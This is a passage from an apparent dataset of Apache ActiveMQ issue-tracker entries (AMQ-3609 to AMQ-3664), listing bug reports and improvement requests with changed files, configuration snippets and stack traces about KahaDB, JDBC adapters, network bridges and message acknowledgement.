20, 21, 22, 23, 24, 25, 26, 27, 28, 29]  - FastConsumer Received: 30 [0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29]testBoundedtestBounded: Publisher Sent: 30 [0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29]testBounded: Whilst slow consumer blocked:  - SlowConsumer Received: 1 [0]  - FastConsumer Received: 30 [0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29]testBounded: After slow consumer unblocked:  - SlowConsumer Received: 10 [0, 1, 2, 3, 4, 25, 26, 27, 28, 29]  - FastConsumer Received: 30 [0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29]testBoundedWithOptimiseAcknowledgetestBoundedWithOptimiseAcknowledge: Publisher Sent: 30 [0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29]testBoundedWithOptimiseAcknowledge: Whilst slow consumer blocked:  - SlowConsumer Received: 1 [0]  - FastConsumer Received: 5 [0, 1, 2, 3, 4]testBoundedWithOptimiseAcknowledge: After slow consumer unblocked:  - SlowConsumer Received: 5 [0, 1, 2, 3, 4]  - FastConsumer Received: 5 [0, 1, 2, 3, 4]java.lang.AssertionError: Fast consumer missed messages whilst slow consumer was blocking expected:<[0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29]> but was:<[0, 1, 2, 3, 4]>
issueID:AMQ-3609
type:Improvement
changed files:
texts:Turn inactivity monitor thread off by default
By default schedulePeriodForDestinationPurge is set to run every 5 second, checking every destination if it needs to be checked or deleted. That can put a lot of stress on brokers with many destinations. As for it to actually work properly what it need to do, the separate destination policy changes must be set, so keeping this on by default doesn"t make much sense.We should keep it off by default (0) and set it explicitly if the check is needed.
issueID:AMQ-3611
type:Improvement
changed files:OracleJDBCAdapter.java
OracleBlobJDBCAdapter.java
texts:Revert the Oracle jdbc adapter to a variant of the default jdbc adapter in place of the one supporting blobs
The blob support does non atomic updates on a message add and is a little inefficient due to the need to insert and update the blob. With the latest ojdbc6.jar oracle drivers, blobs can  be used under the hood so the default jdbc adapter can work with oracle.Currently the following configuration will achieve this:<persistenceAdapter>            <jdbcPersistenceAdapter dataSource="#oracle-ds">                <adapter>                   <defaultJDBCAdapter>                     <statements>                       <statements longDataType="NUMBER" sequenceDataType="NUMBER" />                      </statements>                   </defaultJDBCAdapter>                 </adapter>            </jdbcPersistenceAdapter>        </persistenceAdapter> where oracle-ds is a bean:<bean id="oracle-ds" class="org.apache.commons.dbcp.BasicDataSource" destroy-method="close">     <property name="driverClassName" value="oracle.jdbc.OracleDriver" />     <property name="url" value="jdbc:oracle:thin:@localhost:1521:amq" />     <property name="username" value="user" />     <property name="password" value="pass" />     </bean>This enhancement will make the Oracle adapter behave like this by default such that the following configuration will work<jdbcPersistenceAdapter dataSource="#oracle-ds" /> and will not manipulate blobs directly.If blob support is necessary for backward compatibility for earlier drivers the blob adapter can be specified using the adapter element:<persistenceAdapter>            <jdbcPersistenceAdapter dataSource="#oracle-ds">                <adapter>                   <oracleBlobJDBCAdapter />                 </adapter>            </jdbcPersistenceAdapter>        </persistenceAdapter>
issueID:AMQ-3613
type:Improvement
changed files:
texts:Rename rendezvous discovery scheme to zeroconf
ActiveMQ implements 2 protocols to discover agents and broadcasts packets : multicast (default) and rendezvous.It makes sense to use zeroconf as the name instead of rendezvous:  to avoid confusion with Tibco RendezVous technology, because the RendezVous name is not longer used by Apple. Due to Trademark/Copyright issues, Apple has changed this name into Bonjour (http://en.wikipedia.org/wiki/Bonjour_(software)).It implements the zeroconf protocol so it is more exact.
issueID:AMQ-3614
type:Bug
changed files:IdGenerator.java
texts:Unable to generate unique id when range of ports are blocked - org.apache.activemq.util.IdGenerator
org.apache.activemq.util.IdGenerator is unable to generate a unique id if a range of ports have been block.Currently there is only one strategy create this id if the canAccessSystemProps condition is true:if (canAccessSystemProps) {            try {                hostName = InetAddressUtil.getLocalHostName();                ServerSocket ss = new ServerSocket(0);                stub = "-" + ss.getLocalPort() + "-" + System.currentTimeMillis() + "-";                Thread.sleep(100);                ss.close();            } catch (Exception ioe) {                LOG.warn("could not generate unique stub", ioe);            }        } else {            hostName = "localhost";            stub = "-1-" + System.currentTimeMillis() + "-";        }No fallback strategy has been implemented if the canAccessSystemProp evaluates to true
issueID:AMQ-3615
type:Improvement
changed files:AdvisorySupport.java
AdvisoryBroker.java
texts:Advisory broker replay of destination advisories needs to distinguish temp destination from regular destination
By default an activemq connection registers an advisory consumer for temp destinations. This is configurable via: jms.watchTopicAdvisories. This allow the client to respond to a request to a deleted temp destination without a round trip to the broker and avoid a possible auto creation. At the moment, that advisory consumer gets notified of all destinations, not just temp destinations. So if there are large amounts of destinations, there is an unnecessary flood of advisories on the initial subscribe.The workaround, for clients who don"t use temps is to disable this advisory monitor, using jms.watchTopicAdvisories=false on the connection factory broker url or setting the corresponding property on the connection factory or connection.
issueID:AMQ-3618
type:Bug
changed files:KahaDBPersistenceAdapter.java
MessageDatabase.java
texts:when using openwire with cacheEnabled=false memory is wasted on unmarshallCache[] and marshallCache[]
The OpenWireFormat has 2 array fields unmarshallCache[] and marshallCache[] which together consume 256K, in case of many TopicConsumers when using FilePendingMessageCursor this causes allot of memory to be used by the OpenWire caching arrays. even if you disable caching these arrays are still created.
issueID:AMQ-3619
type:Improvement
changed files:CreateCommand.java
texts:Enhance "create" script
Create script should copy the whole conf/ directory instance start script should be executable by default add examples how to set ACTIVEMQ_OPTS in instance executable
issueID:AMQ-3621
type:New Feature
changed files:
texts:Integrate Apache Shiro with ActiveMQ as "security solution"
Integrate Apache Shiro with ActiveMQ as "security solution".This would benefit for ActiveMQ to have support for a vast amount of already existing solution (Realm implementations) that are out there for Shiro.
issueID:AMQ-3622
type:Bug
changed files:
texts:NPE in LastImageSubscriptionRecoveryPolicy
Start up a subscriber when no messages are available and this NPE will eventually get logged:2011-12-02 15:01:00,588 | WARN  | Failed to browse Topic: xxx | org.apache.activemq.broker.region.Topic | ActiveMQ Broker&#91;xxx&#93; Schedulerjava.lang.NullPointerException at org.apache.activemq.broker.region.policy.LastImageSubscriptionRecoveryPolicy.browse(LastImageSubscriptionRecoveryPolicy.java:63) at org.apache.activemq.broker.region.Topic.browse(Topic.java:564) at org.apache.activemq.broker.region.Topic$6.run(Topic.java:659) at org.apache.activemq.thread.SchedulerTimerTask.run(SchedulerTimerTask.java:33) at java.util.TimerThread.mainLoop(Timer.java:512) at java.util.TimerThread.run(Timer.java:462)repeatedly every 30 seconds or so until a message is sent to the topic.
issueID:AMQ-3623
type:New Feature
changed files:
texts:Add DefaultTestAppender utility abstract class
Couple tests keep an eye on the logging for specific failures, be good to have a common approach to this.
issueID:AMQ-3624
type:New Feature
changed files:TransportConnector.java
TransportConnection.java
texts:Add IP address of clients to ERROR messages created within transport layer
There"s a fairly important case where an error message is logged due to an accept failure, however the remote address info isn"t logged as part of this message.  There"s a couple other spots where socket and I/O exceptions are logged without remote host info, again this lack of info makes it more difficult to correlate an exception to a remote client.
issueID:AMQ-3625
type:Bug
changed files:TransportConnection.java
texts:NullPointer Exceptions when networked broker sends certificate with an invalid user name
Couple NPEs pop out when a connecting one broker to another using authentication if the authentication fails:WARN | Failed to add Connection ID:Susan-Javureks-MacBook-Pro-3.local-53150-1322608354523-5:1, reason: java.lang.SecurityException: User name &#91;null&#93; or password is invalid. No user for client certificate: CN=Dave Stanley, OU=FuseSource, O=Progress, L=Unknown, ST=MA, C=USWARN | Async error occurred: java.lang.SecurityException: User name &#91;null&#93; or password is invalid. No user for client certificate: CN=Dave Stanley, OU=FuseSource, O=Progress, L=Unknown, ST=MA, C=USjava.lang.SecurityException: User name &#91;null&#93; or password is invalid. No user for client certificate: CN=Dave Stanley, OU=FuseSource, O=Progress, L=Unknown, ST=MA, C=USat org.apache.activemq.security.JaasCertificateAuthenticationBroker.addConnection(JaasCertificateAuthenticationBroker.java:102)at org.apache.activemq.broker.BrokerFilter.addConnection(BrokerFilter.java:85)at org.apache.activemq.broker.MutableBrokerFilter.addConnection(MutableBrokerFilter.java:91)at org.apache.activemq.broker.TransportConnection.processAddConnection(TransportConnection.java:707)at org.apache.activemq.broker.jmx.ManagedTransportConnection.processAddConnection(ManagedTransportConnection.java:77)at org.apache.activemq.command.ConnectionInfo.visit(ConnectionInfo.java:139)at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:318)at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:181)at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:69)at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:113)at org.apache.activemq.transport.InactivityMonitor.onCommand(InactivityMonitor.java:227)at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83)at org.apache.activemq.transport.tcp.SslTransport.doConsume(SslTransport.java:91)at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:223)at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:205)at java.lang.Thread.run(Thread.java:680)Caused by: javax.security.auth.login.FailedLoginException: No user for client certificate: CN=Dave Stanley, OU=FuseSource, O=Progress, L=Unknown, ST=MA, C=USat org.apache.activemq.jaas.CertificateLoginModule.login(CertificateLoginModule.java:93)at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)at java.lang.reflect.Method.invoke(Method.java:597)at javax.security.auth.login.LoginContext.invoke(LoginContext.java:769)at javax.security.auth.login.LoginContext.access$000(LoginContext.java:186)at javax.security.auth.login.LoginContext$4.run(LoginContext.java:683)at java.security.AccessController.doPrivileged(Native Method)at javax.security.auth.login.LoginContext.invokePriv(LoginContext.java:680)at javax.security.auth.login.LoginContext.login(LoginContext.java:579)at org.apache.activemq.security.JaasCertificateAuthenticationBroker.addConnection(JaasCertificateAuthenticationBroker.java:87)... 15 moreWARN | Async error occurred: java.lang.NullPointerExceptionjava.lang.NullPointerExceptionat org.apache.activemq.broker.TransportConnection.processAddProducer(TransportConnection.java:512)at org.apache.activemq.command.ProducerInfo.visit(ProducerInfo.java:105)at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:318)at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:181)at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:69)at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:113)at org.apache.activemq.transport.InactivityMonitor.onCommand(InactivityMonitor.java:227)at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83)at org.apache.activemq.transport.tcp.SslTransport.doConsume(SslTransport.java:91)at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:223)at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:205)at java.lang.Thread.run(Thread.java:680)WARN | Async error occurred: java.lang.NullPointerExceptionjava.lang.NullPointerExceptionat org.apache.activemq.broker.TransportConnection.processAddConsumer(TransportConnection.java:551)at org.apache.activemq.command.ConsumerInfo.visit(ConsumerInfo.java:349)at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:318)at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:181)at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:69)at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:113)at org.apache.activemq.transport.InactivityMonitor.onCommand(InactivityMonitor.java:227)at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83)at org.apache.activemq.transport.tcp.SslTransport.doConsume(SslTransport.java:91)at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:223)at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:205)at java.lang.Thread.run(Thread.java:680)In this case the actual problem is the certificate doesn"t match the configured password, but the two NPEs after this exception don"t look good.
issueID:AMQ-3628
type:Bug
changed files:
texts:AMQ3567Test doesn&#39;t clean up appender after AMQ-3623 update
Left the appender added to the root appender when I updated AMQ3567Test as part of AMQ-3623, so here"s a patch that ensures that appender is cleaned up, thanks Claudio for spotting that.
issueID:AMQ-3630
type:Bug
changed files:DemandForwardingBridgeSupport.java
texts:NetworkBridgeFilterFactory should be assigned to Queue not NetworkBridge
We can assign NetworkBridgeFilterFactory such as DefaultNetworkBridgeFilterFactory or conditionalNetworkBridgeFilterFactory for queue.But the source code on the trunk,class DemandForwardingBridgeSupport in fact, assigns NetworkBridgeFilterFactory to NetworkBridge,this causes DefaultNetworkBridgeFilterFactory will be applied at first even though specifying conditionalNetworkBridgeFilterFactory for the queue.The solution is making property filterFactory of DemandForwardingBridgeSupport to be a local variable in the method createNetworkBridgeFilter.
issueID:AMQ-3632
type:New Feature
changed files:
texts:Allow easy creation of purely static bridges
Introduce new boolean property which will prevent network connector to create listener for consumer advisory messages and only bridge statically defined destinations, like<networkConnector ... staticBridge="true">        <staticallyIncludedDestinations>        <queue physicalName="always.include.queue"/>        </staticallyIncludedDestinations></networkConnector>This will help in cases when we want to create "purely" static network between brokers and prevent remote consumer information affect the local broker (and also decrease load on the network connector by not having advisories exchanged between brokers)
issueID:AMQ-3634
type:New Feature
changed files:
texts:Automatic recovery on startup when index is corrupted
When index is corrupted broker won"t start up. Index files need to be deleted and broker restarted. This leads to unnecessary downtime and manual intervention which is prone to error. It"d be better to automatically delete (archive) the index and start recovering in those situations.
issueID:AMQ-3636
type:New Feature
changed files:
texts:Integrate stomp-websocket into web demo application
and integrate its tests into our unit testing
issueID:AMQ-3637
type:Bug
changed files:
texts:NullPointerException while loading node from kahadb during vmcursor replay
When the vmQueueCursor is used with persistent messages that have a time to live (ttl) expiry set. If the broker down time exceeds the ttl, on recovery the messages are replayed through the vm cursor and an expiry check is done, leading to the messages getting deleted. This nested kahaDB transaction (to remove the message) can badly effect the iterator traversing the store, leading to missed messages and the NPE below. The recovery processing needs to be batched such that periodic expiry can occur with out nesting transactions.INFO | Recovery replayed 7784653 operations from the journal in 895.065 seconds. INFO | ActiveMQ 5.5.1-fuse-01-11 JMS Message Broker () is starting INFO | For help or more information please see: http://activemq.apache.org/ERROR | Failed to start ActiveMQ JMS Message Broker (). Reason: java.lang.NullPointerExceptionjava.lang.NullPointerException at org.apache.kahadb.index.BTreeIndex.loadNode(BTreeIndex.java:264) at org.apache.kahadb.index.BTreeNode$BTreeIterator.findNextPage(BTreeNode.java:103) at org.apache.kahadb.index.BTreeNode$BTreeIterator.hasNext(BTreeNode.java:121) at org.apache.activemq.store.kahadb.MessageDatabase$MessageOrderIndex$MessageOrderIterator.hasNext(MessageDatabase.java:2597) at org.apache.activemq.store.kahadb.KahaDBStore$KahaDBMessageStore$3.execute(KahaDBStore.java:506) at org.apache.kahadb.page.Transaction.execute(Transaction.java:760) at org.apache.activemq.store.kahadb.KahaDBStore$KahaDBMessageStore.recover(KahaDBStore.java:502) at org.apache.activemq.store.ProxyMessageStore.recover(ProxyMessageStore.java:52) at org.apache.activemq.broker.region.Queue.initialize(Queue.java:267) at org.apache.activemq.broker.region.DestinationFactoryImpl.createDestination(DestinationFactoryImpl.java:86) at org.apache.activemq.broker.region.AbstractRegion.createDestination(AbstractRegion.java:487) at org.apache.activemq.broker.region.AbstractRegion.addDestination(AbstractRegion.java:125) at org.apache.activemq.broker.region.RegionBroker.addDestination(RegionBroker.java:301) at org.apache.activemq.broker.BrokerFilter.addDestination(BrokerFilter.java:145) at org.apache.activemq.advisory.AdvisoryBroker.addDestination(AdvisoryBroker.java:145) at org.apache.activemq.broker.BrokerFilter.addDestination(BrokerFilter.java:145) at org.apache.activemq.broker.BrokerFilter.addDestination(BrokerFilter.java:145) at org.apache.activemq.broker.MutableBrokerFilter.addDestination(MutableBrokerFilter.java:151) at org.apache.activemq.broker.region.AbstractRegion.start(AbstractRegion.java:97) at org.apache.activemq.broker.region.RegionBroker.start(RegionBroker.java:201) at org.apache.activemq.broker.BrokerFilter.start(BrokerFilter.java:157) at org.apache.activemq.broker.BrokerFilter.start(BrokerFilter.java:157) at org.apache.activemq.broker.TransactionBroker.start(TransactionBroker.java:123) at org.apache.activemq.broker.BrokerService$3.start(BrokerService.java:1814) at org.apache.activemq.broker.BrokerService.start(BrokerService.java:494) at ... INFO | ActiveMQ Message Broker (null) is shutting down
issueID:AMQ-3638
type:Improvement
changed files:PageFile.java
LFUCache.java
texts:Add LFU page cache as an option for kahaDB
Add an option to use a LFU page cache for the KahaDB index (default is LRU page cache).Enable LFUCache by setting useIndexLFRUEviction on KahaDBPersistenceAdaptor
issueID:AMQ-3639
type:Improvement
changed files:
texts:Modify MKahaDB To Support Using One Adapter Per Destination Without Explicity Listing Every Desintation In The Configuration
We would like to have the ability to configure MKahaDB to use one adapter per queue without having to explicitly list every queue in our ActiveMQ configuration.http://activemq.2283324.n4.nabble.com/MKahaDB-Configure-To-use-One-Adapter-Per-Queue-td4204743.html
issueID:AMQ-3645
type:Improvement
changed files:
texts:Improve shall script to work better in shared-broker environment
Allow setting the variables likeACTIVEMQ_CONFIG_DIRACTIVEMQ_USERACTIVEMQ_KILL_MAXSECONDSACTIVEMQ_QUEUEMANAGERURLtrough environment. Additionally if ACTIVEMQ_USER is used, data directory should be created with an appropriate credentials
issueID:AMQ-3646
type:Improvement
changed files:
texts:Allow KahaDB to run without disk syncs, higher through put without the jms persistence guarantee
When using the broker as a buffer for persistent data, large bursts or additions, periodic batch removes, we want to become disk bound. Waiting for disk syncs causes unnecessary pauses. If the JMS durability guarantee is not needed, it should be possible to execute without disk syncs. Syncing only on shutdown.
issueID:AMQ-3649
type:Bug
changed files:DefaultIOExceptionHandler.java
texts:NPE when KahaDB fails to store to Journal with EOFException
2012-01-03 19:17:50,646 | DEBUG | commit: TX:ID:foo-7365-1325617993757-0:1:1 syncCount: 2 | org.apache.activemq.transaction.LocalTransaction | ActiveMQ Transport: tcp:///bar:132192012-01-03 19:17:50,650 | ERROR | KahaDB failed to store to Journal | org.apache.activemq.store.kahadb.MessageDatabase | ActiveMQ Transport: tcp:///bar:13219java.io.EOFException at java.io.RandomAccessFile.readFully(RandomAccessFile.java:383) at java.io.RandomAccessFile.readFully(RandomAccessFile.java:361) at org.apache.kahadb.page.PageFile.readPage(PageFile.java:779) at org.apache.kahadb.page.Transaction$2.readPage(Transaction.java:440) at org.apache.kahadb.page.Transaction$2.<init>(Transaction.java:431) at org.apache.kahadb.page.Transaction.openInputStream(Transaction.java:428) at org.apache.kahadb.page.Transaction.load(Transaction.java:404) at org.apache.kahadb.page.Transaction.load(Transaction.java:361) at org.apache.kahadb.index.BTreeIndex.loadNode(BTreeIndex.java:262) at org.apache.kahadb.index.BTreeIndex.getRoot(BTreeIndex.java:174) at org.apache.kahadb.index.BTreeIndex.put(BTreeIndex.java:189) at org.apache.activemq.store.kahadb.MessageDatabase.upadateIndex(MessageDatabase.java:1026) at org.apache.activemq.store.kahadb.MessageDatabase$AddOpperation.execute(MessageDatabase.java:1777) at org.apache.activemq.store.kahadb.MessageDatabase$18.execute(MessageDatabase.java:976) at org.apache.kahadb.page.Transaction.execute(Transaction.java:728) at org.apache.activemq.store.kahadb.MessageDatabase.process(MessageDatabase.java:973) at org.apache.activemq.store.kahadb.MessageDatabase$13.visit(MessageDatabase.java:874) at org.apache.activemq.store.kahadb.data.KahaCommitCommand.visit(KahaCommitCommand.java:130) at org.apache.activemq.store.kahadb.MessageDatabase.process(MessageDatabase.java:856) at org.apache.activemq.store.kahadb.MessageDatabase.store(MessageDatabase.java:783) at org.apache.activemq.store.kahadb.KahaDBTransactionStore.commit(KahaDBTransactionStore.java:270) at org.apache.activemq.transaction.LocalTransaction.commit(LocalTransaction.java:72) at org.apache.activemq.broker.TransactionBroker.commitTransaction(TransactionBroker.java:173) at org.apache.activemq.broker.MutableBrokerFilter.commitTransaction(MutableBrokerFilter.java:103) at org.apache.activemq.broker.TransportConnection.processCommitTransactionOnePhase(TransportConnection.java:420) at org.apache.activemq.command.TransactionInfo.visit(TransactionInfo.java:100) at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:306) at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:179) at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:69) at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:113) at org.apache.activemq.transport.InactivityMonitor.onCommand(InactivityMonitor.java:227) at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83) at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:220) at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:202) at java.lang.Thread.run(Thread.java:619)2012-01-03 19:17:50,650 | WARN  | Store COMMIT FAILED:  | org.apache.activemq.transaction.LocalTransaction | ActiveMQ Transport: tcp:///bar:13219java.lang.NullPointerException at org.apache.activemq.util.DefaultIOExceptionHandler.handle(DefaultIOExceptionHandler.java:54) at org.apache.activemq.broker.BrokerService.handleIOException(BrokerService.java:2193) at org.apache.activemq.store.kahadb.MessageDatabase.store(MessageDatabase.java:804) at org.apache.activemq.store.kahadb.KahaDBTransactionStore.commit(KahaDBTransactionStore.java:270) at org.apache.activemq.transaction.LocalTransaction.commit(LocalTransaction.java:72) at org.apache.activemq.broker.TransactionBroker.commitTransaction(TransactionBroker.java:173) at org.apache.activemq.broker.MutableBrokerFilter.commitTransaction(MutableBrokerFilter.java:103) at org.apache.activemq.broker.TransportConnection.processCommitTransactionOnePhase(TransportConnection.java:420) at org.apache.activemq.command.TransactionInfo.visit(TransactionInfo.java:100) at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:306) at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:179) at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:69) at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:113) at org.apache.activemq.transport.InactivityMonitor.onCommand(InactivityMonitor.java:227) at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83) at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:220) at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:202) at java.lang.Thread.run(Thread.java:619)2012-01-03 19:17:50,651 | DEBUG | rollback: TX:ID:foo-7365-1325617993757-0:1:1 syncCount: 2 | org.apache.activemq.transaction.LocalTransaction | ActiveMQ Transport: tcp:///bar:132192012-01-03 19:17:50,651 | DEBUG | Error occured while processing sync command: TransactionInfo {commandId = 229, responseRequired = true, type = 2, connectionId = ID:foo-7365-1325617993757-0:1, transactionId = TX:ID:foo-7365-1325617993757-0:1:1}, exception: javax.transaction.xa.XAException: STORE COMMIT FAILED: Transaction rolled back. | org.apache.activemq.broker.TransportConnection.Service | ActiveMQ Transport: tcp:///bar:13219javax.transaction.xa.XAException: STORE COMMIT FAILED: Transaction rolled back. at org.apache.activemq.transaction.LocalTransaction.commit(LocalTransaction.java:77) at org.apache.activemq.broker.TransactionBroker.commitTransaction(TransactionBroker.java:173) at org.apache.activemq.broker.MutableBrokerFilter.commitTransaction(MutableBrokerFilter.java:103) at org.apache.activemq.broker.TransportConnection.processCommitTransactionOnePhase(TransportConnection.java:420) at org.apache.activemq.command.TransactionInfo.visit(TransactionInfo.java:100) at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:306) at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:179) at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:69) at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:113) at org.apache.activemq.transport.InactivityMonitor.onCommand(InactivityMonitor.java:227) at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83) at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:220) at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:202) at java.lang.Thread.run(Thread.java:619)Caused by: java.lang.NullPointerException at org.apache.activemq.util.DefaultIOExceptionHandler.handle(DefaultIOExceptionHandler.java:54) at org.apache.activemq.broker.BrokerService.handleIOException(BrokerService.java:2193) at org.apache.activemq.store.kahadb.MessageDatabase.store(MessageDatabase.java:804) at org.apache.activemq.store.kahadb.KahaDBTransactionStore.commit(KahaDBTransactionStore.java:270) at org.apache.activemq.transaction.LocalTransaction.commit(LocalTransaction.java:72) ... 13 more
issueID:AMQ-3651
type:Bug
changed files:ManagementContext.java
texts:If the broker binds RMI registry port when it starts up, the broker should release RMI registry port when it shuts down
None
issueID:AMQ-3652
type:Improvement
changed files:BrokerViewMBean.java
texts:Typo in BrokerViewMBean javadoc
There is a trivial typo in javadoc for BrokerViewMBean.gc method.
issueID:AMQ-3653
type:Bug
changed files:
texts:content-length header should be considered only for SEND frames
If for example ACK frame contains content-length it will not be parsed correctly as broker will try to read a body of the specified length. We should only try to do this for SEND commands and ignore the header for others.
issueID:AMQ-3654
type:Bug
changed files:
texts:JDBC Master/Slave : Slave cannot acquire lock when the master loose database connection.
Our configuration is JDBC Master/Slave with one master and one slave. When the master is started, he acquire the database lock.Then when the slave is started, he wait to acquire the database lock. When the master loose the network connection to the database, the lock in the database is not removed and the slave connot acquire the database lock. In this situation, the master is unable to respond to client (due to network failure)and the slave is not started because he can"t acquire the database lock.When the master is killed, the slave can"t acquire the database lock too. After the network connection is restored, when the master starts, it cannotacquire lock to the database (because the lod lock is always present) so now, we have two slaves and no master.Please, refer to this issue which is the same problem : AMQ-1958
issueID:AMQ-3659
type:Improvement
changed files:
texts:Wrapper scripts configuration needs adjusting with respect to chkconfig
activemq wrapper scripts (in bin/linux-x86-64, bin/linux-x86-32, bin/macosx) have the wrong chkconfig directives - probably just got the start/stop levels round the wrong way:    chkconfig: 2345 20 80Starting at level 20 is probably a bit too early I would suggest & something like start level of 80 is probably more appropriate. Problems can be seen with starting this early in some environments, probably because other services are not up at that point such as the network service.Stop level of 20 is probably more appropriate as well since we want the broker to be shutdown before the network and other services, so chkconfig directive should be something like:    chkconfig: 2345 80 20
issueID:AMQ-3664
type:Bug
changed files:
texts:Not all messages will be acknowledged when optimizeAcknowledge is true
I make performance test with activemq. When I set optimizeAcknowledge = true I get a dramatic performance improvement, but when I shut down the producer the consumer does not acknowledge all messages! If I stop the consumer and then I start the consumer a second time the consumer recieves messages again and again not all messages will be acknoledged in the queue.I am using camel 2.9.0 to produce and consume the messages.I am using the consumer Template with asyncSendBody.The following route is configured in the camelContext:    <camel:camelContext id="camelContext">     <camel:template id="producerTemplate"/>     <camel:consumerTemplate id="consumerTemplate"/>     <camel:route>      <camel:from uri="jms:queue0?concurrentConsumers=3&amp;maxConcurrentConsumers=10&amp;asyncConsumer=true"/>      <camel:to uri="beanConsumer"/>     </camel:route>    </camel:camelContext>The config for the ActiveMQComponent:    <bean id="jms" class="org.apache.activemq.camel.component.ActiveMQComponent">  <property name="connectionFactory">     <bean class="org.apache.activemq.pool.PooledConnectionFactory">       <property name="connectionFactory">       <bean class="org.apache.activemq.spring.ActiveMQConnectionFactory">         <property name="optimizeAcknowledge" value="true"/>         <property name="dispatchAsync" value="true"/>        <property name="sendAcksAsync" value="true"/>        <property name="useAsyncSend" value="true"/>       <property name="brokerURL" value="nio://138-ham-de:61616"/>              <property name="useDedicatedTaskRunner" value="false"/>         </bean>          </property>        </bean>       </property>    </bean>I think, the problem is here:Class ActiveMQMessageConsumer:    private void afterMessageIsConsumed(MessageDispatch md, boolean messageExpired) throws JMSException {        if (unconsumedMessages.isClosed()) {            return;        }        if (messageExpired) {            synchronized (deliveredMessages) {                deliveredMessages.remove(md);            }            stats.getExpiredMessageCount().increment();            ackLater(md, MessageAck.DELIVERED_ACK_TYPE);        } else {            stats.onMessage();            if (session.getTransacted()) {                // Do nothing.            } else if (isAutoAcknowledgeEach()) {                if (deliveryingAcknowledgements.compareAndSet(false, true)) {                    synchronized (deliveredMessages) {                        if (!deliveredMessages.isEmpty()) {                            if (optimizeAcknowledge) {                                ackCounter++;                                if (ackCounter >= (info.getPrefetchSize() * .65) || System.currentTimeMillis() >= (optimizeAckTimestamp + optimizeAckTimeout)) {                                 MessageAck ack = makeAckForAllDeliveredMessages(MessageAck.STANDARD_ACK_TYPE);                                 if (ack != null) {                                  deliveredMessages.clear();                                  ackCounter = 0;                                  session.sendAck(ack);                                  optimizeAckTimestamp = System.currentTimeMillis();                                 }                                }                            } else {                                MessageAck ack = makeAckForAllDeliveredMessages(MessageAck.STANDARD_ACK_TYPE);                                if (ack!=null) {                                    deliveredMessages.clear();                                    session.sendAck(ack);                                }                            }                        }                    }                    deliveryingAcknowledgements.set(false);                }            } else if (isAutoAcknowledgeBatch()) {                ackLater(md, MessageAck.STANDARD_ACK_TYPE);            } else if (session.isClientAcknowledge()||session.isIndividualAcknowledge()) {                boolean messageUnackedByConsumer = false;                synchronized (deliveredMessages) {                    messageUnackedByConsumer = deliveredMessages.contains(md);                }                if (messageUnackedByConsumer) {                    ackLater(md, MessageAck.DELIVERED_ACK_TYPE);                }            }             else {                throw new 